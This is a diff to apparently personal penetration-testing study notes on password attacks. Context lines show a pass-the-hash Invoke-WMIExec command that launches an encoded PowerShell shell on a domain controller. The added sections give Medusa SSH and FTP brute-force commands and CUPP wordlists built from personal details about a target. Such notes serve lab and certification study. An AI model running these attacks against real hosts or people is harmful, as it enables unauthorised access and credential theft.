@@ -440,7 +440,7 @@ Invoke-WMIExec -Target DC01 -Domain domain.local -Username username \
   -Hash NT_HASH -Command "powershell -e BASE64_SHELL"
 ```
 
-🔁 [[Password Attacks (HTB Supplementary)#PA.18. Pass the Hash — Deep Dive|PA.18]], [[Password Attacks#16.3.2. Passing NTLM|16.3.2]]
+🔁 [[Password Attacks (HTB Supplementary)#PA.18. Pass the Hash. Deep Dive|PA.18]], [[Password Attacks#16.3.2. Passing NTLM|16.3.2]]
 
 ---
 
@@ -518,4 +518,58 @@ evil-winrm -i dc01.domain.local -r domain.local
 
 ---
 
-#### Tags: #CommandAppendix #PasswordAttacks #Hydra #Hashcat #JohnTheRipper #Mimikatz #Responder #ntlmrelayx #PassTheHash #impacket #NetNTLMv2 #NTLM #CredentialGuard #kerbrute #PtT #PtC #PassTheTicket #PassTheCertificate #pypykatz #LaZagne #NTDS #VSS #BitLocker #usernameAnarchy #SAMDump #Kerberos #pywhisker #PKINITtools
+---
+
+## Medusa (SSH and FTP brute-force)
+
+Alternative to Hydra. More reliable for FTP on slow targets; syntax is slightly different.
+
+```bash
+# SSH brute-force (single user, password list)
+# -h = host, -n = port, -u = user, -P = wordlist, -M = module, -t = threads
+medusa -h TARGET -n PORT -u USERNAME -P /path/to/passwords.txt -M ssh -t 3
+
+# FTP brute-force (single user, single host)
+medusa -h 127.0.0.1 -u ftpuser -P passwords.txt -M ftp -t 5
+
+# FTP brute-force (username list)
+medusa -h 127.0.0.1 -U thomas_smith.txt -P passwords.txt -M ftp -t 5 | grep "ACCOUNT FOUND"
+```
+
+Key differences vs Hydra:
+- `-n PORT` instead of appending port to the target (Hydra uses `ssh://TARGET:PORT` or `-s PORT`)
+- `-u`/`-U` for single username vs username list (Hydra uses `-l`/`-L`)
+- Stops automatically after first hit in single-target mode (no `-f` needed)
+
+🔁 [[Login Brute Forcing (HTB Supplementary)#LBF.5. Web Services. Medusa (SSH + Internal FTP Pivot)|LBF.5 Medusa SSH+FTP chain]]
+
+---
+
+## CUPP (Targeted Password Wordlist Generation)
+
+Generates personalised password lists from OSINT data about a specific target.
+
+```bash
+sudo apt install cupp -y
+cupp -i    # interactive mode — walks through prompts
+# Prompts: first name, surname, nickname, birthdate, partner, pet, company, keywords
+# Options at end: special chars, random numbers, leet-speak
+# Output: <firstname>.txt  (tens of thousands of entries)
+```
+
+**Filter CUPP output to match a known password policy:**
+```bash
+# Minimum 6 chars + uppercase + lowercase + digit + 2 special chars
+grep -E '^.{6,}$' jane.txt \
+  | grep -E '[A-Z]' \
+  | grep -E '[a-z]' \
+  | grep -E '[0-9]' \
+  | grep -E '([!@#$%^&*].*){2,}' \
+  > jane-filtered.txt
+```
+
+🔁 [[Login Brute Forcing (HTB Supplementary)#LBF.6. Custom Wordlists (CUPP + username-anarchy + grep filtering)|LBF.6 full workflow]]
+
+---
+
+#### Tags: #CommandAppendix #PasswordAttacks #Hydra #Hashcat #JohnTheRipper #Mimikatz #Responder #ntlmrelayx #PassTheHash #impacket #NetNTLMv2 #NTLM #CredentialGuard #kerbrute #PtT #PtC #PassTheTicket #PassTheCertificate #pypykatz #LaZagne #NTDS #VSS #BitLocker #usernameAnarchy #SAMDump #Kerberos #pywhisker #PKINITtools #Medusa #CUPP
